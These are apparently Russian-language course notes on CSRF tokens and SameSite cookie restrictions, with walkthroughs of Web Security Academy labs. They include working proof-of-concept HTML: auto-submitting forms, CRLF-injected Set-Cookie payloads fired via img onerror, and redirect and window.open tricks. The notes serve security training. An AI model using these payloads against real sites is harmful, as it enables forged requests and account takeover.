...
- **CSRF-токены** [[Учебный курс — кибербезопасность/04 Безопасность приложений/03 Аутентификация и сессии/02 CSRF#Что такое CSRF-токен?|Что такое CSRF-токен?]]
...
![[Учебный курс — кибербезопасность/04 Безопасность приложений/03 Аутентификация и сессии/assets/Pasted image 20250114182435.png]]
...
>
> > _Хотя они тесно связаны, важно не использовать эти термины как синонимы, так как смешение может иметь серьёзные последствия для безопасности._
...
4. В PoC перед формой вставляем полученную ранее CRLF для GET запросы:
   ...
   > ```html
   > <img
   >   src="https://YOUR-LAB-ID.web-security-academy.net/?search=qwe%0d%0aSet-Cookie:+csrfKey%3dtZ6oMFdQPmMZgi4zrcr9aoKc3gS0FhtJ%3b+SameSite%3dNone"
...
<html>
  ...
  <body>
    ...
    <img
      src="https://YOUR-LAB-ID.web-security-academy.net/?search=qwe%0d%0aSet-Cookie:+csrfKey%3dYOUR-KEY%3b+SameSite%3dNone"
      onerror="document.forms[0].submit()"
    />
  </body>
</html>
...
<html>
  ...
  <body>
    ...
    <img
      src="https://YOUR-LAB-ID.web-security-academy.net/?search=qwe%0d%0aSet-Cookie:+csrf=123%3b+SameSite%3dNone"
      onerror="document.forms[0].submit()"
    />
  </body>
</html>
...
3. Пробуем сменить GET метод на POST через GET-параметры:
   ...
   >    ![[Учебный курс — кибербезопасность/04 Безопасность приложений/03 Аутентификация и сессии/assets/Pasted image 20260123162000.png]]
...
1. Найдём другие уязвимости на сайте.
   ...
   >
   > ![[Учебный курс — кибербезопасность/04 Безопасность приложений/03 Аутентификация и сессии/assets/Pasted image 20260123173112.png]]
1. Попробуем отсюда открыть WSS сессию той же нагрузкой, что была на эксплойт сервере - успех, мы видим историю.
1. В Burp находит тот `POST` запрос, через который мы закинул в username свой payload. Пробуем сменить метод на GET - успех. Копируем URL.
1. Вставляем в эксплойт сервер редирект на уязвимый поддомен:
   > ```html
   > <script>
   >   document.location =
...
2. В стандартный PoC просто добавляем открытие страницы логина и задержку:
   ...
   >     <script>
   >       window.open(
   >         "https://YOUR-LAB-ID.web-security-academy.net/social-login",
   >       );
...
![[Учебный курс — кибербезопасность/04 Безопасность приложений/03 Аутентификация и сессии/assets/Pasted image 20250113212910.png]]
...
![[Учебный курс — кибербезопасность/04 Безопасность приложений/03 Аутентификация и сессии/assets/SameSite ограничения.png]]
![[Учебный курс — кибербезопасность/04 Безопасность приложений/03 Аутентификация и сессии/assets/SameSite strict.png]]
...
<html>
  ...
  <body>
    <form
      action="https://0a89008e03d199f389c89f8100bb0096.web-security-academy.net/my-account/change-email"
    >
...
$FORM
<img
  src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None"
  onerror="document.forms[0].submit()"
/>
```
...
<html>
  ...
  <body>
    <form
      action="https://0a28001a0421cd37808adad500f500b1.web-security-academy.net/my-account/change-email"
      method="POST"
    >
